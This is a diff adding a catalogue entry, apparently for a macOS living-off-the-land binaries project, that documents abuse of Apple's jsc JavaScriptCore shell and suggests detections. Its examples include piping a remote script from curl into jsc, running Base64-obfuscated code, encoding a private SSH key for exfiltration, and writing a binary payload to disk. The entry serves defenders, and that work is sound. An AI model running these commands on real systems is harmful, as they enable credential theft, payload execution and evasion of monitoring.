@@ -1,0 +1,74 @@
+name: jsc
+author: Brendan Chamberlain (@infosecB)
+short_description: Execute JavaScript and read or write arbitrary files using the JavaScriptCore command-line shell.
+full_description: jsc is the command-line shell for JavaScriptCore, the JavaScript engine used by Safari and WebKit. It ships with macOS inside the JavaScriptCore framework but is not on the default PATH. Since macOS Ventura, the framework lives in the OS cryptex on the Preboot volume, and /System/Library/Frameworks/JavaScriptCore.framework is a symlink into it, so process telemetry typically reports the resolved /System/Volumes/Preboot/Cryptexes/OS/... path. Beyond evaluating JavaScript from a file, an inline expression, or standard input, the shell exposes built-in helpers such as readFile(), writeFile(), load(), and runString(), and supports WebAssembly. These give an attacker an Apple-signed interpreter for executing obfuscated script content, reading files, and writing arbitrary (including binary) files outside of commonly monitored interpreters such as osascript, python3, or perl. jsc has no native networking or shell execution capability, so it is typically paired with other tooling for those stages.
+created: 2026-11-07
+example_use_cases:
+  - name: Execute JavaScript from a file, an inline expression, or standard input
+    description: jsc evaluates JavaScript passed as a file, with the -e flag, or piped through standard input. This provides an alternative to JXA via osascript for executing attacker-controlled script content with a signed Apple binary.
+    code: |-
+      /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc payload.js -- arg1 arg2
+      /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'print("hello")'
+      curl -s https://example.com/payload.js | /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags:
+      - javascript
+      - oneliner
+      - bash
+  - name: Execute an obfuscated Base64 encoded payload
+    description: The atob() and eval() functions can be combined to decode and run a Base64 encoded script, keeping the plaintext script content off the command line and out of files on disk.
+    code: /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'eval(atob("cHJpbnQoJ2RlY29kZWQnKQ=="))'
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags:
+      - javascript
+      - base64
+      - oneliner
+  - name: Read and Base64 encode the contents of a file
+    description: The readFile() built-in reads any file the current user can access. Combined with btoa(), file contents can be encoded for staging or exfiltration through another channel.
+    code: /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'print(btoa(readFile("/Users/<user>/.ssh/id_rsa")))'
+    tactics:
+      - Collection
+      - Credential Access
+    tags:
+      - javascript
+      - base64
+      - oneliner
+  - name: Decode and write a binary payload to disk
+    description: The writeFile() built-in accepts a Uint8Array, allowing an attacker to decode an embedded Base64 blob and write an arbitrary binary such as a Mach-O executable to disk without using base64, xxd, or similar tools.
+    code: /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'var s=atob("<base64 blob>"); var b=new Uint8Array(s.length); for(var i=0;i<s.length;i++) b[i]=s.charCodeAt(i); writeFile("/tmp/payload", b)'
+    tactics:
+      - Defense Evasion
+    tags:
+      - javascript
+      - base64
+      - oneliner
+  - name: Execute a WebAssembly module
+    description: jsc supports the WebAssembly API, so an attacker can compile and run a WebAssembly module, which makes payload logic harder to inspect than plaintext JavaScript.
+    code: /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc -e 'var m=new WebAssembly.Module(readFile("payload.wasm","binary")); new WebAssembly.Instance(m).exports.main()'
+    tactics:
+      - Execution
+      - Defense Evasion
+    tags:
+      - javascript
+      - webassembly
+paths:
+  - /System/Library/Frameworks/JavaScriptCore.framework/Versions/Current/Helpers/jsc
+  - /System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc
+  - /System/Cryptexes/OS/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc
+  - /System/Volumes/Preboot/Cryptexes/OS/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/Helpers/jsc
+detections:
+  - name: "Process execution detection: any execution of jsc (legitimate use is rare outside of developer and WebKit testing workflows). Match on the JavaScriptCore.framework/Versions/*/Helpers/jsc path suffix so both the symlinked and resolved cryptex paths are covered"
+    url: N/A
+  - name: "Command-line detection: jsc invoked with -e containing eval/atob/writeFile/readFile, or with jsc as the child of curl, a shell reading from a pipe, or a non-developer parent process"
+    url: N/A
+  - name: "File creation detection: files written by the jsc process, especially Mach-O executables or files in /tmp, /Users/Shared, or ~/Library/LaunchAgents"
+    url: N/A
+resources:
+  - name: JavaScriptCore - WebKit Documentation
+    url: https://docs.webkit.org/Deep%20Dive/JSC/JavaScriptCore.html
+  - name: jsc (Michael Tsai)
+    url: https://mjtsai.com/blog/2021/08/26/jsc/
